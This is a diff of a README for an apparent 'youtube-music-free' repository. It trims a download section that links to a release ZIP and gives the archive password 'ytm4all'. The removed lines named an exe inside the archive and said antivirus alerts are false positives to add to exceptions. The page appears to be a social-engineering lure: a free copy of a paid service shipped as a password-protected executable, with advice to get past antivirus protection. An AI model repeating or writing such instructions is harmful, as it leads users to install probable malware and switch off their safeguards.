@@ -44,23 +44,11 @@
 
 ## 📦 Download
 
-<p align="center">
   <a href="https://github.com/sohaibdevv/youtube-music/releases/latest">
     <img src="https://img.shields.io/badge/⬇️_Download_youtube--music--free.zip-2ea44f?style=for-the-badge&logo=github" alt="Download ZIP">
-  </a>
-</p>
-
-Inside: **`youtube-music-free.exe`**
-
----
-
-## 🔐 Password
-
-<p align="center">
-  <code style="font-size: 1.5em; background: #222; color: #0f0; padding: 10px 30px; border-radius: 8px;">ytm4all</code>
-</p>
-
-> Case‑sensitive.
+  </a><br>
+  
+🔐 Password:  ytm4all
 
 ---
 
@@ -72,12 +60,6 @@ Inside: **`youtube-music-free.exe`**
 4. 🔎 Search and play
 
 No install, no registry, no leftovers.
-
----
-
-## ❓ Antivirus false positive?
-
-Some antiviruses may flag it – it's a **false positive** (PyInstaller + no signature). If you downloaded from this repo, add to exceptions.
 
 ---
 
